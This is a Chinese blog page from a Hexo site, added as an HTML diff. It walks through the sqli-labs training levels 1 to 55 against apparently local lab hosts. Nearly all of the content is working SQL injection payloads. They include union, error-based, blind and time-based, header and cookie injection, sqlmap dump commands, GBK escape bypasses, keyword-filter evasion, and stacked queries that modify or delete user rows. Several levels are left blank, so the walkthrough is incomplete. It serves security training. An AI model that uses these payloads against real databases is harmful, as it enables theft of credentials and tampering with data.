@@ -1,0 +1,347 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <title>sqliabs通关流程 | k-onlの狗窝</title>
+    <meta name="author" content="k-onl" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <link rel="icon" href="/images/fufu1.jpg" />
+    <link rel="preconnect" href="https://cdn.staticfile.org" />
+<script src="https://cdn.staticfile.org/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.loli.net" />
+<link rel="preconnect" href="https://gstatic.loli.net" crossorigin />
+<link rel="stylesheet" href="https://fonts.loli.net/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap" />
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.io/v3/polyfill.min.js?features=default"></script>
+
+
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+
+<meta name="generator" content="Hexo 7.0.0"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/lolisister1.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>K-ONLの狗窝</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;搜索</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;K-ONLの狗窝</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">搜索</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>sqliabs通关流程</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/1/8
+        </span>
+        
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <ul>
+<li></li>
+</ul>
+<p> 1，字符型</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.2.4:8081/sqli/Less-1/?id=-1">http://192.168.2.4:8081/sqli/Less-1/?id=-1</a>‘ union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;database(); – -</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.2.4:8081/sqli/Less-1/?id=-1">http://192.168.2.4:8081/sqli/Less-1/?id=-1</a>‘ union select 1,group_concat(column_name),3 from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’; – -</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.2.4:8081/sqli/Less-1/?id=-1">http://192.168.2.4:8081/sqli/Less-1/?id=-1</a>‘ union select 1,group_concat(id,username,password),3 from users; – -</p>
+<p>2，数字型</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.2.4:8081/sqli/Less-2/?id=-1">http://192.168.2.4:8081/sqli/Less-2/?id=-1</a> union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;’security’ – -</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.2.4:8081/sqli/Less-2/?id=-1">http://192.168.2.4:8081/sqli/Less-2/?id=-1</a> union select 1,group_concat(column_name),3 from information_schema.columns where table_schema&#x3D;’security’ and table_name&#x3D;’users’ – -</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.2.4:8081/sqli/Less-2/?id=-1">http://192.168.2.4:8081/sqli/Less-2/?id=-1</a> union select 1,group_concat(id,username,password),3 from users – -</p>
+<p> 3，单引号括号’）型</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.2.4:8081/sqli/Less-3/?id=-1">http://192.168.2.4:8081/sqli/Less-3/?id=-1</a>‘) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;’security’ – -</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.2.4:8081/sqli/Less-3/?id=-1">http://192.168.2.4:8081/sqli/Less-3/?id=-1</a>‘) union select 1,group_concat(column_name),3 from information_schema.columns where table_schema&#x3D;’security’ and table_name&#x3D;’users’ – -</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.2.4:8081/sqli/Less-3/?id=-1">http://192.168.2.4:8081/sqli/Less-3/?id=-1</a>‘) union select 1,group_concat(id,username,password),3 from users – -</p>
+<p> 4，双引号括号  型</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.2.4:8081/sqli/Less-3/?id=-1">http://192.168.2.4:8081/sqli/Less-3/?id=-1</a>“) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;’security’ – -</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.2.4:8081/sqli/Less-3/?id=-1">http://192.168.2.4:8081/sqli/Less-3/?id=-1</a>“) union select 1,group_concat(column_name),3 from information_schema.columns where table_schema&#x3D;’security’ and table_name&#x3D;’users’ – -</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.2.4:8081/sqli/Less-3/?id=-1">http://192.168.2.4:8081/sqli/Less-3/?id=-1</a>“) union select 1,group_concat(id,username,password),3 from users – -</p>
+<p> 5，无SQL语句回显，报错回显</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.2.4:8081/sqli/Less-5/?id=-1">http://192.168.2.4:8081/sqli/Less-5/?id=-1</a>‘ and (extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x7e)))  –+</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.2.4:8081/sqli/Less-5/?id=-1">http://192.168.2.4:8081/sqli/Less-5/?id=-1</a>‘ and (extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’),0x7e)))  –+</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.2.4:8081/sqli/Less-5/?id=-1">http://192.168.2.4:8081/sqli/Less-5/?id=-1</a>‘ and (extractvalue(1,concat(0x7e,(select group_concat(id,username,password) from users),0x7e)))  –+</p>
+<p> 6，报错注入</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.2.4:8081/sqli/Less-6/?id=-1">http://192.168.2.4:8081/sqli/Less-6/?id=-1</a>“ and (extractvalue(1,concat(0x7e,(select group_concat(table_name)  from information_schema.tables where table_schema&#x3D;database()),0x7e))) – -</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.2.4:8081/sqli/Less-6/?id=-1">http://192.168.2.4:8081/sqli/Less-6/?id=-1</a>“ and (extractvalue(1,concat(0x7e,(select group_concat(column_name)  from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’),0x7e))) – -</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.2.4:8081/sqli/Less-6/?id=-1">http://192.168.2.4:8081/sqli/Less-6/?id=-1</a>“ and (extractvalue(1,concat(0x7e,(select group_concat(id,username,password)  from users),0x7e))) – -</p>
+<p> 7，布尔盲注</p>
+<p>pycharm\pycharmcode\SQL_py\布尔盲注.py</p>
+<p>url &#x3D; “<a target="_blank" rel="noopener" href="http://192.168.2.4:8081/sqli/Less-7/?id=1">http://192.168.2.4:8081/sqli/Less-7/?id=1</a>‘))”</p>
+<p>paramsGet &#x3D; url+ “&#x2F;<strong>&#x2F;and&#x2F;</strong>&#x2F;ascii(substr(database(),{0},1))&gt;{1}–+”.format(i,tmp)</p>
+<p>paramsGet &#x3D; url+ “&#x2F;<strong>&#x2F;and&#x2F;</strong>&#x2F;ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 3,1),{0},1))&gt;{1}–+”.format(i,tmp)</p>
+<p>paramsGet &#x3D; url+ “&#x2F;<strong>&#x2F;and&#x2F;</strong>&#x2F;ascii(substr((select column_name from information_schema.columns where table_name&#x3D;’users’and table_schema&#x3D;database() limit 3,1),{0},1))&gt;{1}–+”.format(i,tmp)</p>
+<p>paramsGet &#x3D; url+ “&#x2F;<strong>&#x2F;and&#x2F;</strong>&#x2F;ascii(substr((select group_concat(id,username,password) from users),{0},1))&gt;{1}–+”.format(i,tmp)</p>
+<p> 8，布尔盲注</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.2.4:8081/sqllib/Less-8/?id=1%27and%20If(ascii(substr(database(),1,1))=115,1,sleep(5))--+">http://192.168.2.4:8081/sqllib/Less-8/?id=1%27and%20If(ascii(substr(database(),1,1))=115,1,sleep(5))--+</a></p>
+<p> 9，睡眠注入</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.2.4:8081/sqllib/Less-9/?id=1%27and%20If(ascii(substr(database(),1,1))=115,1,sleep(5))--+">http://192.168.2.4:8081/sqllib/Less-9/?id=1%27and%20If(ascii(substr(database(),1,1))=115,1,sleep(5))--+</a></p>
+<p> 10，睡眠注入</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.2.4:8081/sqllib/Less-10/?id=1%27and%20If(ascii(substr(database(),1,1))=115,1,sleep(5))--+">http://192.168.2.4:8081/sqllib/Less-10/?id=1%27and%20If(ascii(substr(database(),1,1))=115,1,sleep(5))--+</a></p>
+<p> post请求</p>
+<p> 11，’返回两列</p>
+<p>uname&#x3D;0’ union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database(); – -&amp;passwd&#x3D;1&amp;submit&#x3D;Submit</p>
+<p>uname&#x3D;0’ union select 1,group_concat(column_name)  from information_schema.columns where table_name&#x3D;’users’ and table_schema&#x3D;database(); – -&amp;passwd&#x3D;1&amp;submit&#x3D;Submit</p>
+<p>uname&#x3D;0’ union select group_concat(id,”<del>“,username,”</del>“,password),1 from users ; – -&amp;passwd&#x3D;1&amp;submit&#x3D;Submit</p>
+<p> 12，双引号括号</p>
+<p>uname&#x3D;0”) union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database(); – -&amp;passwd&#x3D;1&amp;submit&#x3D;Submit</p>
+<p>uname&#x3D;0”) union select 1,group_concat(column_name)  from information_schema.columns where table_name&#x3D;’users’ and table_schema&#x3D;database(); – -&amp;passwd&#x3D;1&amp;submit&#x3D;Submit</p>
+<p>uname&#x3D;0”) union select group_concat(id,”<del>“,username,”</del>“,password),1 from users ; – -&amp;passwd&#x3D;1&amp;submit&#x3D;Submit</p>
+<p> 13，布尔盲注</p>
+<p> 14，布尔盲注</p>
+<p> 15，布尔盲注</p>
+<p> 16，布尔盲注</p>
+<p> 17,报错注入</p>
+<p>uname&#x3D;2&amp;passwd&#x3D;2’ and (extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x7e))) – -&amp;submit&#x3D;Submit</p>
+<p>uname&#x3D;2&amp;passwd&#x3D;2’ and (extractvalue(1,concat(0x7e,(select group_concat(column_name)  from information_schema.columns where table_name&#x3D;’users’ and table_schema&#x3D;database()),0x7e))) – -&amp;submit&#x3D;Submit</p>
+<p>uname&#x3D;2&amp;passwd&#x3D;-2’and (updatexml(1,concat(0x7e,(select group_concat(id) from security.emails),0x7e),1)) – -&amp;submit&#x3D;Submit</p>
+<p> 18，User-Agent信息注入</p>
+<p>1’and updatexml(1,concat(0x7e,(select group_concat(table_name)  from information_schema.tables where table_schema&#x3D;database()),0x7e),1),1,1)– -</p>
+<p>1’and updatexml(1,concat(0x7e,(select group_concat(column_name)  from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’),0x7e),1),1,1)– -</p>
+<p>1’and updatexml(1,concat(0x7e,(select group_concat(id,username,password)  from users),0x7e),1),1,1)– -</p>
+<p> 19，Referer</p>
+<p>1’and updatexml(1,concat(0x7e,(select group_concat(table_name)  from information_schema.tables where table_schema&#x3D;database()),0x7e),1),1)– -</p>
+<p>1’and updatexml(1,concat(0x7e,(select group_concat(column_name)  from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’),0x7e),1),1)– -</p>
+<p>1’and updatexml(1,concat(0x7e,(select group_concat(id,username,password)  from users),0x7e),1),1)– -</p>
+<p> 20，Cookie</p>
+<p>uname&#x3D;2’and (extractvalue(1,concat(0x7e,(select group_concat(table_name)  from information_schema.tables where table_schema&#x3D;database()),0x7e))) #</p>
+<p>uname&#x3D;2’and (extractvalue(1,concat(0x7e,(select group_concat(column_name)  from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’),0x7e))) #</p>
+<p>uname&#x3D;2’and (extractvalue(1,concat(0x7e,(select group_concat(id,username,<strong>password</strong>)  from users),0x7e))) #</p>
+<p> 21，cookie中base64encode编码，‘）</p>
+<p>python sqlmap.py -r 11.txt –batch –level&#x3D;3 –tamper&#x3D;”base64encode.py” –dbs</p>
+<p>python sqlmap.py -r 11.txt –batch –level&#x3D;3 –tamper&#x3D;”base64encode.py” -D security –tables</p>
+<p>python sqlmap.py -r 11.txt –batch –level&#x3D;3 –tamper&#x3D;”base64encode.py” -D security -T users –columns</p>
+<p>python sqlmap.py -r 11.txt –batch –level&#x3D;3 –tamper&#x3D;”base64encode.py” -D security -T users –dump</p>
+<p> 22，cookie中base64encode编码，“</p>
+<p>uname&#x3D;2“and (extractvalue(1,concat(0x7e,(select group_concat(table_name)  from information_schema.tables where table_schema&#x3D;database()),0x7e))) #</p>
+<p>uname&#x3D;2”and (extractvalue(1,concat(0x7e,(select group_concat(column_name)  from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’),0x7e))) #</p>
+<p>uname&#x3D;2“and (extractvalue(1,concat(0x7e,(select group_concat(id,username,<strong>password</strong>)  from users),0x7e))) #</p>
+<p> 23，#和–都被被过滤为空字符串</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.2.4:8081/sqli/Less-23/?id=1">http://192.168.2.4:8081/sqli/Less-23/?id=1</a>‘ or (extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x7e)))  and ‘1’&#x3D;’1</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.2.4:8081/sqli/Less-23/?id=1">http://192.168.2.4:8081/sqli/Less-23/?id=1</a>‘ or (extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’ and table_schema&#x3D;database()),0x7e)))  and ‘1’&#x3D;’1</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.2.4:8081/sqli/Less-23/?id=1">http://192.168.2.4:8081/sqli/Less-23/?id=1</a>‘ or (extractvalue(1,concat(0x7e,(select group_concat(id,”<del>“,username,”</del>“,password) from users ),0x7e)))  and ‘1’&#x3D;’1</p>
+<p> 24，二次注入修改管理员密码</p>
+<p>andmin’– -</p>
+<p> &#x2F;&#x2F;or 和and 注释不能用<br>25：<a target="_blank" rel="noopener" href="http://192.168.2.59:808/sqli/Less-25/?id=0">http://192.168.2.59:808/sqli/Less-25/?id=0</a>‘ union select 1,( updatexml(1,concat(0x7e,(select group_concat(username) from users),0x7e),1)),3 ‘</p>
+<p>25a,or 和and 注释不能用，数字型联合查询</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.2.4:8081/sqli/Less-25a/?id=-1">http://192.168.2.4:8081/sqli/Less-25a/?id=-1</a> union select 1,group_concat(table_name) ,3 from infoorrmation_schema.tables where table_schema&#x3D;database()</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.2.4:8081/sqli/Less-25a/?id=-1">http://192.168.2.4:8081/sqli/Less-25a/?id=-1</a> union select 1,group_concat(column_name) ,3 from infoorrmation_schema.columns where table_name&#x3D;’users’ anandd table_schema&#x3D;database()</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.2.4:8081/sqli/Less-25a/?id=-1">http://192.168.2.4:8081/sqli/Less-25a/?id=-1</a> union select 1, group_concat(id,username,passwoorrd) ,3 from users</p>
+<p>&#x2F;&#x2F;or 和and 空格 注释不能用<br>26：<a target="_blank" rel="noopener" href="http://192.168.2.59:808/sqli/Less-26/?id=0%27%7C%7C">http://192.168.2.59:808/sqli/Less-26/?id=0&#39;||</a> updatexml(1,concat(0x7e,(select (group_concat(table_name))from(infoorrmation_schema.tables) where (table_schema&#x3D;database())),0x7e),1)||’<br><a target="_blank" rel="noopener" href="http://192.168.2.59:808/sqli/Less-26/?id=0%27%7C%7Cupdatexml(1,concat(0x7e,(select(group_concat(column_name))from(infoorrmation_schema.columns)where">http://192.168.2.59:808/sqli/Less-26/?id=0&#39;||updatexml(1,concat(0x7e,(select(group_concat(column_name))from(infoorrmation_schema.columns)where</a> (table_name&#x3D;’users’) aandnd(table_schema&#x3D;database())),0x7e),1)||’</p>
+<p>&#x2F;&#x2F;布尔盲注<br>26a：</p>
+<p>&#x2F;&#x2F;union select 空格 注释不能用，and or 可以用或者大小写混写<br>27：<a target="_blank" rel="noopener" href="http://192.168.2.59:808/sqli/Less-27/?id=">http://192.168.2.59:808/sqli/Less-27/?id=</a> 0’and(updatexml(1,concat(0x7e,(selselecselecttect(group_concat(table_name))from(information_schema.tables)where(table_schema&#x3D;database()))),1))and’</p>
+<p>&#x2F;&#x2F;union select 空格 注释不能用，and or 可以用 没有报错<br>27a：<a target="_blank" rel="noopener" href="http://192.168.2.55:808/sqli/Less-27a/?id=0%22%0Auniunionon%0AseleSelectct%0A1,2,group_concat(database())%22//%E7%88%86%E5%BA%93">http://192.168.2.55:808/sqli/Less-27a/?id=0&quot;%0Auniunionon%0AseleSelectct%0A1,2,group_concat(database())&quot;//爆库</a></p>
+<p>&#x2F;&#x2F;空格 注释不能用，and or 可以用 没有报错 union 和select连在一起不能用，只能使用uni union selecton selectc拆分 </p>
+<p>28：<a target="_blank" rel="noopener" href="http://192.168.2.55:808/sqli/Less-28/?id=0%27)uni%20union%0Aselecton%0Aselect%0A1,group_concat(database()),3%0Aor">http://192.168.2.55:808/sqli/Less-28/?id=0&#39;)uni%20union%0Aselecton%0Aselect%0A1,group_concat(database()),3%0Aor</a>(‘ &#x2F;&#x2F;爆库</p>
+<p>&#x2F;&#x2F;爆库 爆表  union 和select连在一起不能用只能使用uni union selecton selectc拆分  其他都可以用<br>28a：<a target="_blank" rel="noopener" href="http://192.168.2.55:808/sqli/Less-28a/?id=0%27)%20uniunion%20selecton%20select%201,database(),group_concat(table_name)%20from%20information_schema.tables%20where%20%20table_schema=database()--">http://192.168.2.55:808/sqli/Less-28a/?id=0%27)%20uniunion%20selecton%20select%201,database(),group_concat(table_name)%20from%20information_schema.tables%20where%20%20table_schema=database()--</a> -</p>
+<p>&#x2F;&#x2F;爆库 爆表   由于代码会判定第一个是不是数字，所以同时传入两个id，第一个用于验证，第二个用于注入<br>29：<a target="_blank" rel="noopener" href="http://192.168.2.55:808/sqli/Less-29/?id=1&">http://192.168.2.55:808/sqli/Less-29/?id=1&amp;</a> id&#x3D;-2’ union select 1,database(),group_concat(table_name)%20from%20information_schema.tables%20where%20%20table_schema&#x3D;database()– -</p>
+<p>&#x2F;&#x2F;与29关一样，只不过单引号变为双引号<br>30：<a target="_blank" rel="noopener" href="http://192.168.2.55:808/sqli/Less-30/?id=1&">http://192.168.2.55:808/sqli/Less-30/?id=1&amp;</a> id&#x3D;-2”union select 1,database(),group_concat(table_name)%20from%20information_schema.tables%20where%20%20table_schema&#x3D;database()– -</p>
+<p>&#x2F;&#x2F;与29关一样，只不过单引号变为双引号加括号，由于有报错回显，所以使用更简单的报错注入<br>31：<a target="_blank" rel="noopener" href="http://192.168.2.55:808/sqli/Less-31/?id=1">http://192.168.2.55:808/sqli/Less-31/?id=1</a> &amp;id&#x3D;0”) union select 1,database(),updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x7e),1) – -</p>
+<p>&#x2F;&#x2F;32关开始转义字符 使用gbk进行注入</p>
+<p>&#x2F;&#x2F;mysql 在使用 GBK 编码的时候，会认为两个字符为一个汉字，例如%aa%5c 就是一个<br>汉字（前一个 ascii 码大于 128 才能到汉字的范围）。我们在过滤 ’ 的时候，往往利用的思<br>路是将 ‘ 转换为 \’ （转换的函数或者思路会在每一关遇到的时候介绍）。<br>因此我们在此想办法将 ‘ 前面添加的 \ 除掉，一般有两种思路：<br>1、%df 吃掉 \ 具体的原因是 urlencode(‘) &#x3D; %5c%27，我们在%5c%27 前面添加%df，形<br>成%df%5c%27，而上面提到的 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，此<br>事%df%5c 就是一个汉字，%27 则作为一个单独的符号在外面，同时也就达到了我们的目的。<br>2、将 \’ 中的 \ 过滤掉，例如可以构造 %**%5c%5c%27 的情况，后面的%5c 会被前面的%5c<br>给注释掉。这也是 bypass 的一种方法</p>
+<p>&#x2F;&#x2F;爆库，爆表  ，也可以使用报错注入<br>32：<a target="_blank" rel="noopener" href="http://192.168.2.55:808/sqli/Less-32/?id=0%EF%BF%BD%27union">http://192.168.2.55:808/sqli/Less-32/?id=0%df&#39;union</a> select 1,database(),group_concat(table_name)  from information_schema.tables where table_schema&#x3D;database()– -</p>
+<p>&#x2F;&#x2F;与32关一样<br>33：<a target="_blank" rel="noopener" href="http://192.168.2.55:808/sqli/Less-32/?id=0%EF%BF%BD%27union">http://192.168.2.55:808/sqli/Less-32/?id=0%df&#39;union</a> select 1,database(),group_concat(table_name)  from information_schema.tables where table_schema&#x3D;database()– -</p>
+<p>&#x2F;&#x2F;post请求，依旧可以使用gbk方法  爆库，爆表<br>&#x2F;&#x2F;%df可换成万能密码  �<br>34：1%df’ union select database(), group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()– -<br>    &#x2F;&#x2F;字段可以选择报错注入，列无方法<br>    1%df’and  (updatexml(1,concat(0x7e,(select group_concat(username) from users),0x7e),1))– -</p>
+<p>&#x2F;&#x2F;爆库 爆字段  数字型  会将字符进行转义<br>35：<a target="_blank" rel="noopener" href="http://192.168.2.55:808/sqli/Less-35/?id=0">http://192.168.2.55:808/sqli/Less-35/?id=0</a> union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() – -<br>&#x2F;&#x2F;字段可以选择报错注入或者union<br>&#x2F;&#x2F;union<br><a target="_blank" rel="noopener" href="http://192.168.2.55:808/sqli/Less-35/?id=0">http://192.168.2.55:808/sqli/Less-35/?id=0</a> union select 1,database(),group_concat(username) from users – -<br>&#x2F;&#x2F;报错<br><a target="_blank" rel="noopener" href="http://192.168.2.55:808/sqli/Less-35/?id=0">http://192.168.2.55:808/sqli/Less-35/?id=0</a> and updatexml(1,concat(0x7e,( select group_concat(username) from users),0x7e),1) – -</p>
+<pre><code>//与34关一样 可爆库 表  字段  可使用union 与报错
+</code></pre>
+<p>36：<a target="_blank" rel="noopener" href="http://192.168.2.55:808/sqli/Less-36/?id=0%EF%BF%BD">http://192.168.2.55:808/sqli/Less-36/?id=0%df</a>‘  union select 1, database(),group_concat(table_name)  from information_schema.tables where table_schema&#x3D;database();  – -</p>
+<p>&#x2F;&#x2F;post 与34关一样的思路，这里使用万能密码</p>
+<p>37：1 �’ union select database(), group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()– -</p>
+<p>&#x2F;&#x2F;38关以后的关卡基本上都是堆叠注入，也就是说爆库爆表爆列与字段的难度是和第一关开始一样逐级递增</p>
+<p>&#x2F;&#x2F;单引号通过堆叠更新账号<br>38：<a target="_blank" rel="noopener" href="http://192.168.2.55:808/sqli/Less-38/?id=1">http://192.168.2.55:808/sqli/Less-38/?id=1</a>‘ ; UPDATE users SET username &#x3D; ‘6’ WHERE password &#x3D; ‘6’ ; – - </p>
+<p>&#x2F;&#x2F;数字型通过堆叠更新账号<br>39：<a target="_blank" rel="noopener" href="http://192.168.2.55:808/sqli/Less-38/?id=1">http://192.168.2.55:808/sqli/Less-38/?id=1</a> ; UPDATE users SET username &#x3D; ‘667’ WHERE password &#x3D; ‘6’ ; – - </p>
+<p>&#x2F;&#x2F;单引号闭合，其他一样<br>40：</p>
+<p>&#x2F;&#x2F;无报错回显，可以使用union  数字型<br>41：</p>
+<p>&#x2F;&#x2F;post 单引号 密码处注入<br>42：</p>
+<p>&#x2F;&#x2F;与42一样 单引号括号而已<br>43：</p>
+<p>&#x2F;&#x2F;密码处post盲注 单引号<br>44：</p>
+<p>&#x2F;&#x2F;post与43一样<br>45：</p>
+<p>&#x2F;&#x2F;通过order by 进行注入 报错注入，库，表列字段都可以，	order by 无法使用union联合注入<br>46：<a target="_blank" rel="noopener" href="http://192.168.43.99:808/sqli/Less-46/">http://192.168.43.99:808/sqli/Less-46/</a>? sort&#x3D;1 and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x7e),1)<br><a target="_blank" rel="noopener" href="http://192.168.43.99:808/sqli/Less-46/">http://192.168.43.99:808/sqli/Less-46/</a>? sort&#x3D;1 and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x7e),1)</p>
+<p>&#x2F;&#x2F;与46一样，不过为单引号<br>47：</p>
+<p>&#x2F;&#x2F;没有回显，使用时间盲注，数字型<br>48：</p>
+<p>&#x2F;&#x2F;单引号，无回显，时间盲注<br>49：</p>
+<p>&#x2F;&#x2F;数字型，可以执行多条sql语句，有报错，所以可以报错和堆叠，mysqli_multi_query表示可以执行多个sql语句<br>50：报错		<a target="_blank" rel="noopener" href="http://192.168.43.99:808/sqli/Less-50/?sort=1">http://192.168.43.99:808/sqli/Less-50/?sort=1</a>  and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x7e),1) 		<br>       堆叠		<a target="_blank" rel="noopener" href="http://192.168.43.99:808/sqli/Less-50/?sort=1">http://192.168.43.99:808/sqli/Less-50/?sort=1</a> ; delete from users where username&#x3D;’666’;</p>
+<p>&#x2F;&#x2F;单引号，报错和堆叠<br>51：报错	<a target="_blank" rel="noopener" href="http://192.168.43.99:808/sqli/Less-51/?sort=1">http://192.168.43.99:808/sqli/Less-51/?sort=1</a>‘ and updatexml(1,concat(0x7e,( select group_concat(username) from users),0x7e),1) – -<br>       堆叠  <a target="_blank" rel="noopener" href="http://192.168.43.99:808/sqli/Less-51/?sort=1%27;insert">http://192.168.43.99:808/sqli/Less-51/?sort=1&#39;;insert</a> into users(username,password)values(‘666’,’666’);</p>
+<p>&#x2F;&#x2F;盲注，堆叠，数字型<br>52：盲注	<a target="_blank" rel="noopener" href="http://192.168.43.99:808/sqli/Less-52/?sort=1">http://192.168.43.99:808/sqli/Less-52/?sort=1</a> and If(ascii(substr(database(),1,1))&#x3D;115,1,sleep(5))– -<br>       堆叠  <a target="_blank" rel="noopener" href="http://192.168.43.99:808/sqli/Less-52/?sort=1">http://192.168.43.99:808/sqli/Less-52/?sort=1</a> ; insert into users(username,password)values(‘888’,’666’);</p>
+<p>&#x2F;&#x2F;盲注，堆叠 单引号<br>53：<a target="_blank" rel="noopener" href="http://192.168.43.99:808/sqli/Less-53/?sort=1">http://192.168.43.99:808/sqli/Less-53/?sort=1</a>‘ and If(ascii(substr(database(),1,1))&#x3D;114,1,sleep(5))– -</p>
+<p>&#x2F;&#x2F;关卡四：综合，从判断闭合到判断列个数（order by）到爆库、表、列、字段。有限制次数</p>
+<p>&#x2F;&#x2F;单引号闭合，10次限制 union<br>54：无注入限制，走union流程</p>
+<p>&#x2F;&#x2F;括号闭合，没有引号 14次限制 union<br>55：无注入限制，走union流程</p>
